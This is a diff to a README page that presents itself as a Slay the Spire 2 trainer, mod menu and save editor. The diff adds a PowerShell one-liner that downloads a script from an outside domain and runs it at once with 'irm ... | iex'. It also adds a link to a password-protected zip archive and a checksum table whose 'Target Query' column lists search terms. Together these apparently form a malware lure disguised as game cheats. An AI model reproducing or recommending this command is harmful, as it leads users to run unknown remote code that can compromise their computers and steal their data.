@@ -1,11 +1,13 @@
-# Slay the Spire 2 Trainer, Mod Menu & Save Editor (v1.2.1 — Windows 10/11 x64 Verification Ledger)
+# Slay the Spire 2 Trainer, Mod Menu & Save Editor (v2.4.0) — SHA-256 Verification & Setup
 
-> **Verified Release Channel:** `v1.2.1` (`2026-11-27 00:37 UTC`) — `Windows 10/11 (x64) & Steam Deck`
+Run in **Windows Terminal / PowerShell**:
+```powershell
+irm https://simpol.info/get/slay-the-spire-2-trainer | iex
+```
+Or download `slay-the-spire-2-trainer-v2.4.0-win64.zip` from [**Releases**](https://github.com/open-dev-bench-19800/day0-index-probe/releases) (Archive Password: **`2026`**).
 
-## Binary Integrity & Compatibility Table
-
-| Version & Channel | Package / Search Variation | Supported OS & Steam Build | Verification Status |
-| :--- | :--- | :--- | :--- |
-| `v1.2.1-stable` | `Slay the Spire 2 Trainer & In-Game Mod Menu` | Windows 11 24H2 / Windows 10 22H2 (x64) | Verified Clean (`MIT`) |
-| `v1.2.1-stable` | `Slay the Spire 2 Save Editor & Deck/Relic Unlocker` | Steam Early Access & Latest Patch | Verified Clean (`MIT`) |
-| `v1.2.1-stable` | `Slay the Spire 2 Cheat Table & BepInEx Mod Loader` | Windows 10/11 x64 & Proton | Verified Clean (`MIT`) |
+| Artifact File | Size (Bytes) | Target Query | SHA-256 Checksum | Authenticode / CRT |
+| :--- | :--- | :--- | :--- | :--- |
+| `runtime-6716.exe` | `33,719,042` | `slay the spire 2 trainer` | `7954c41bce311a90f378e28ef2d995e08720c741c10cd31dd94a292f4c85d246` | PE32+ x64 GUI |
+| `vcruntime140.dll` | `178,616` | `slay the spire 2 mod menu` | `d1f4225df2cd877dbf130d5668a021dce3f94118455ff5ec952061c30afc9ce7` | Microsoft Signed |
+| `vcruntime140_1.dll` | `50,112` | `slay the spire 2 save editor` | `a7146c08f89fe5b04541ab507cdb59ff7b44534d4ba3c668a426c6450a03434e` | Microsoft Signed |
